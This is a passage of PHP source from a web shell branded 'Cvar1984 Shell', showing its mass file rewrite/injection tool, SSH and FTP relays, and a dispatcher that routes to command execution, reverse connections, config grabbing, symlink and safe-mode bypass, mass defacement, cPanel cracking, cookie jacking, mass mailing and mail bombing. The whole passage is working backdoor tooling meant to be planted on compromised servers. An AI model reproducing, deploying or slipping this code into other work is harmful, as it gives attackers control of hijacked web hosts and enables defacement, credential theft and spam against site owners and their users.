    echo "</table><br><br><hr><br><br></div>";
}
function code_in_ui() {
    global $sep;
    $mode   = $_POST['modexxx'];
    $ftype  = $_POST['ffttype'];
    $c_cont = $_POST['code_cont'];
    $ppp    = $_POST['path'];
    if(isset($_POST['modexxx']) && isset($_POST['path']) && isset($_POST['ffttype']) && isset($_POST['code_cont']) && $mode != "" && $ftype != "" && $c_cont != "" && $ppp != "") {
        echo "<div id=result><center><h2>Mass Rewrite Successfully</h2></center><table class=tbl>";
        switch($mode) {
            case "Apender":
                $mmode = "a";
                break;
            case "Rewrite":
                $mmode = "w";
                break;
        }
        if($handle = opendir($ppp)) {
            while(($c_file = readdir($handle)) !== False) {
                if((preg_match("/$ftype" . '$' . '/', $c_file, $matches) != 0) && (preg_match('/' . $c_file . '$/', $self, $matches) != 1)) {
                    echo "<tr><td><font
color=red>$ppp$sep$c_file</font></td></tr>";
                    $fd = fopen($ppp . $sep . $c_file, $mmode);
                    if($fd) {
                        fwrite($fd, $c_cont);
                    } else {
                        alert("Error. Access Denied");
                    }
                }
            }
        }
        echo "</table><br><br><hr><br><br></div>";
    } else {
?>
        <div id=result><center><h2>Mass Rewrite</h2></center><hr><br><br><table class=table><form method='POST'><input type='hidden' name='path' value="<?php
        echo getcwd();
?>"><tr><td>Mode : </td>
        <td><select style='color:yellow; background-color:black;
border:1px solid #666;'
name='modexxx'><option>Rewrite</option><option>Apender</option></select></td></tr><tr><td>File
Type</td><td><input name='ffttype' value='html'
size=50></td></tr>
        <tr><td>Content : </td><td><textarea
name='code_cont' rows=20 cols=60
class='textarea_edit'></textarea></td></tr><tr><td></td><td><input
type=submit value='O' class='input_big' /></td></tr></form></table><br><br><hr><br><br>
    <?php
    }
}
function ssh_man_ui() {
?>
    <div id=result><center><h2>SSH
Manager</h2><hr /><br /><br /><table
class=table><form method='GET'><tr><td>HOST :
</td><td><input size=50
name='ssh_host'></td></tr><tr><td>Username :
</td><td><input size=50
name='ssh_user'></td></tr><tr><td>Password :
</td><td><input size=50
name='ssh_pass'></td></tr><tr><td></td><td><input
type='submit' value='O' /></form></table></center><br><br><hr><br><br></div>
    <?php
}
function ssh_man_bg() {
    $ssh_h = $_GET['ssh_host'];
    $ssh_u = $_GET['ssh_user'];
    $ssh_p = $_GET['ssh_pass'];
    if(!function_exists('ssh2_connect')) {
        alert("Sorry, Function ssh2_connect is not found");
    }
    $conn = ssh2_connect($ssh_h, 22);
    if(!$conn) {
        alert("SSH Host Not Found");
    }
    $log = ssh2_auth_password($conn, $ssh_u, $ssh_p);
    if(!$log) {
        alert("SSH Authorication failed");
    }
    $shell = ssh2_shell($conn, "bash");
    if($_GET['ssh_cmd'] != "" && $_GET['ssh_cmd']) {
        $ssh_cmd = $_GET['ssh_cmd'];
        fwrite($shell, $ssh_cmd);
        sleep(1);
        while($line = fgets($shell)) {
            flush();
            echo $line . "\n";
        }
?>
    <div id=result><center><h2>SSH Shell by Cvar1984
Shell</h2><hr /><br /><br /><textarea
class='textarea_edit' rows=20 cols=60></textarea>
    <form method='GET'>CMD : <input name='ssh_cmd'
size=60><input type='submit' value='O' /></form></center><br><br><hr><br><br></div>
        <?php
    } else {
?>
    <div id=result><center><h2>SSH Shell by Cvar1984
Shell</h2><hr /><br /><br /><textarea
class='textarea_edit' rows=20 cols=60></textarea>
    <form method='GET'>CMD : <input name='ssh_cmd'
size=60><input type='submit' value='O' /></form></center><br><br><hr><br><br></div>
    <?php
    }
}
function ftp_man_ui() {
?>
    <div id=result><center><h2>FTP
Manager</h2><hr /><br /><br /><table
class=table><form method='GET'><tr><td>HOST :
</td><td><input size=50
name='ftp_host'></td></tr>
    <tr><td>Username : </td><td><input size=50
name='ftp_user'></td></tr>
    <tr><td>Password : </td><td><input size=50
name='ftp_pass'></td></tr>
    <tr><td>Path [<font color=red>Optional</font>]
: </td><td><input name='fpath'
size=50></td></tr>
    <tr><td>Upload File From Server [<font
color=red>Optional</font>] : </td><td><input
name='upload_file' size=50></td></tr>
    <tr><td>Download File To Server [<font
color=red>Optional</font>] : </td><td><input
name='download_file' size=50></td></tr>
    <tr><td></td><td><input type='submit'
value='O'
/></form></table></center><br /><br
/><hr /><br /><br /></div>
    <?php
}
function ftp_man_bg() {
    echo "<div id=result><center><h2>FTP FILEMANAGER</h2></center><hr />";
    $fhost = $_GET['ftp_host'];
    $fuser = $_GET['ftp_user'];
    $fpass = $_GET['ftp_pass'];
    $fpath = $_GET['fpath'];
    $upl   = $_GET['upload_file'];
    $down  = $_GET['download_file'];
    if($fpath == "") {
        $fpath = ftp_pwd($conn);
    }
    $conn = ftp_connect($fhost);
    if(!$conn) {
        alert("FTP Host Not Found!!!");
    }
    $log = ftp_login($conn, $fuser, $fpass);
    if(!$log) {
        alert("FTP Authorication Failed");
    }
    if($upl != "") {
        $fp = fopen($upl, 'r');
        if(ftp_fput($conn, $upl, $fp, FTP_ASCII)) {
            echo "<center><font color=yellow>Successfully uploaded <font color=red> $upl </font> </font></center>";
        } else {
            echo "<center><font color=red>There was a problem while uploading <font color=yellow> $upl </font></font></center>";
        }
    }
    if($down != "") {
        $handle = fopen($down, 'w');
        if(ftp_fget($conn, $handle, $down, FTP_ASCII, 0)) {
            echo "<center><font color=yellow>successfully written to <font color=red> $down </font></font></center>";
        } else {
            echo "<center><font color=red>There was a problem while downloading <font color=yellow> $down </font> to <font color=yellow> $down </font></font></center>";
        }
    }
    echo "<table class='table'><tr><th>Files</th>";
    ftp_chdir($fpath);
    $list = ftp_rawlist($conn, $fpath);
    foreach($list as $fff) {
        echo "<tr><td><pre>$fff</pre></td></tr>";
    }
    echo "</table></div>";
}
// Frond End Calls //
if(isset($_POST['e_file']) && isset($_POST['e_content_n'])) {
    edit_file_bg();
} else if(isset($_REQUEST['musik'])) {
    soundcloud();
} else if(isset($_REQUEST['logger'])) {
	 ceklog();
} else if(isset($_REQUEST['ganteng'])) {
    gantengware();
} else if(isset($_REQUEST['phpinfo'])) {
    phpinfo();
} else if(isset($_REQUEST['rctm'])) {
    rctm();
} else if(isset($_REQUEST['idx'])) {
    idxshell();
} else if(isset($_REQUEST['xaishell'])) {
    xaishell();
} else if(isset($_REQUSET['ngindex'])) {
    ngindex();
} else if(isset($_REQUEST['jembud2'])) {
    jembud2();
} else if(isset($_REQUEST['cgi'])) {
    cgi();
} else if(isset($_REQUEST['adminer'])) {
    adminer();
} else if(isset($_REQUEST['sh311_scanner'])) {
    shell_finder_ui();
} else if(isset($_REQUEST['ftp_host']) && isset($_REQUEST['ftp_user']) && isset($_REQUEST['ftp_pass'])) {
    ftp_man_bg();
} else if(isset($_REQUEST['ftpman'])) {
    ftp_man_ui();
} else if(isset($_GET['ssh_host']) && isset($_GET['ssh_user']) && isset($_GET['ssh_pass'])) {
    ssh_man_bg();
} else if(isset($_REQUEST['sshman'])) {
    ssh_man_ui();
} else if(isset($_REQUEST['c0de_inject']) && isset($_REQUEST['path'])) {
    chdir($_GET['path']);
    code_in_ui();
} else if(isset($_GET['sh311_scanx'])) {
    shell_finder_bg();
} else if(isset($_REQUEST['config_grab'])) {
    sym_xxx();
} else if(isset($_REQUEST['ftp_man'])) {
    ftp_man_ui();
} else if(isset($_REQUEST['mass_xploit'])) {
    mass_deface_ui();
} else if(isset($_GET['f_host']) && isset($_GET['f_user']) && isset($_GET['f_pass'])) {
    ftp_man_bg();
} else if(isset($_GET['mass_name']) && isset($_GET['mass_cont'])) {
    mass_deface_bg();
} else if(isset($_REQUEST['ftp_anon_scan'])) {
    ftp_anonymous_ui();
} else if(isset($_GET['ftp_anonz'])) {
    ftp_anonymous_bg();
} else if(isset($_REQUEST['killme'])) {
    killme();
} else if(isset($_REQUEST['hexenc'])) {
    hex_encode_ui();
} else if(isset($_REQUEST['remotefiledown'])) {
    remote_download_ui();
} else if(isset($_GET['type_r_down']) && isset($_GET['rurlfile']) && isset($_GET['path'])) {
    remote_download_bg();
} else if(isset($_REQUEST['cpanel_crack'])) {
    cpanel_crack();
} else if(isset($_REQUEST['rem_web']) && isset($_REQUEST['tryzzz'])) {
    remote_file_check_bg();
} else if(isset($_REQUEST['typed']) && isset($_REQUEST['typenc']) && isset($_REQUEST['php_content'])) {
    php_ende_bg();
} else if(isset($_REQUEST['remote_server_scan'])) {
    remote_file_check_ui();
} else if(isset($_REQUEST['server_exploit_details'])) {
    exploit_details();
} else if(isset($_REQUEST['from']) && isset($_REQUEST['to_mail']) && isset($_REQUEST['subject_mail']) && isset($_REQUEST['mail_content'])) {
    massmailer_bg();
} else if(isset($_REQUEST['mysqlman'])) {
    mysqlman();
} else if(isset($_REQUEST['bomb_to']) && isset($_REQUEST['bomb_subject']) && isset($_REQUEST['bmail_content'])) {
    mailbomb_bg();
} else if(isset($_REQUEST['cookiejack'])) {
    cookie_jack();
} else if(isset($_REQUEST['massmailer'])) {
    massmailer_ui();
} else if(isset($_REQUEST['rename'])) {
    chdir($_GET['path']);
    rename_ui();
} else if(isset($_GET['old_name']) && isset($_GET['new_name'])) {
    chdir($_GET['path']);
    rename_bg();
} else if(isset($_REQUEST['encodefile'])) {
    php_ende_ui();
} else if(isset($_REQUEST['edit'])) {
    edit_file();
} else if(isset($_REQUEST['down']) && isset($_REQUEST['path'])) {
    download();
} else if(isset($_REQUEST['gzip']) && isset($_REQUEST['path'])) {
    download_gzip();
} else if(isset($_REQUEST['read'])) {
    chdir($_GET['path']);
    code_viewer();
} else if(isset($_REQUEST['perm'])) {
    chdir($_GET['path']);
    ch_perm_ui();
} else if(isset($_GET['path']) && isset($_GET['p_filex']) && isset($_GET['new_perm'])) {
    chdir($_GET['path']);
    ch_perm_bg();
} else if(isset($_REQUEST['del_fil'])) {
    chdir($_GET['path']);
    delete_file();
    exit;
} else if(isset($_REQUEST['phpinfo'])) {
    chdir($_GET['path']);
    ob_clean();
    echo phpinfo();
    exit;
} else if(isset($_REQUEST['del_dir'])) {
    chdir($_GET['path']);
    $d_dir = $_GET['del_dir'];
    deldirs($d_dir);
} else if(isset($_GET['path']) && isset($_GET['new_file'])) {
    chdir($_GET['path']);
    mk_file_ui();
} else if(isset($_GET['path']) && isset($_GET['new_f_name']) && isset($_GET['n_file_content'])) {
    mk_file_bg();
} else if(isset($_GET['path']) && isset($_GET['new_dir'])) {
    chdir($_GET['path']);
    create_dir();
} else if(isset($_GET['path']) && isset($_GET['cmdexe'])) {
    chdir($_GET['path']);
    cmd();
} else if(isset($_POST['upload_f']) && isset($_POST['path'])) {
    upload_file();
} else if(isset($_REQUEST['rs'])) {
    reverse_conn_ui();
} else if(isset($_GET['rev_option']) && isset($_GET['my_ip']) && isset($_GET['my_port'])) {
    reverse_conn_bg();
} else if(isset($_REQUEST['safe_mod']) && isset($_REQUEST['path'])) {
    chdir($_GET['path']);
    safe_mode_fuck_ui();
} else if(isset($_GET['path']) && isset($_GET['safe_mode'])) {
    safe_mode_fuck();
} else if(isset($_GET['path']) && isset($_REQUEST['forbd_dir'])) {
    AccessDenied();
} else if(isset($_REQUEST['symlink'])) {
    sym_link();
} else if(isset($_GET['path']) && isset($_GET['copy'])) {
    copy_file_ui();
} else if(isset($_GET['c_file']) && isset($_GET['c_target']) && isset($_GET['cn_name'])) {
    copy_file_bg();
} else {
    filemanager_bg();
}
echo "</div>
<div id=result>
<center><p>
<table class='tbl'><tr><td>
<form method='GET'>PWD :
 <input size='50' name='path' value='" . getcwd() . "'>
<input type='submit' value='O'></form></td></tr></table>
<table class='tbl'><tr>
<td><form style='float:right;' method='GET'>
<input name='path' value='" . getcwd() . "' type=hidden><span> New File : </span>
		  <input type='submit' value='O'>
		  <input size='40' name='new_file'></form>
          </td>
          <td><form  style='float:left;' method='GET'>
		  <input name='path' value='" . getcwd() . "' type=hidden>
		  <input size='40' name='new_dir'>
		  <input type='submit' value='O'>
		  <span> : New Dir</span></form>
          </td>
      </tr>
      <tr>
          <td><form style='float:right;' method='GET'>
		  <input style='float:left;' name='path' value='" . getcwd() . "' type=hidden>
		  <span>CMD : </span>
		  <input type='submit' value='O'>
		  <input name='cmdexe' size='40'></form>
          </td>
          <td><form style='float:left;' method='POST' enctype=\"multipart/form-data\">
		  <input name='path' value='" . getcwd() . "' type=hidden>
		  <input size='27' name='upload_f' type='file'>
		  <input type='submit' name='upload_f' value='O'>
		  <span> : Upload File</span></form>
          </td>
        </tr>
      </table></p>
<font size=4 color=yellow>
<a style='color:yellow;text-decoration:none;' href=https://Cvar1984.Sarahah.com>Feedback</a></center>Date : $date</font></div>";
?>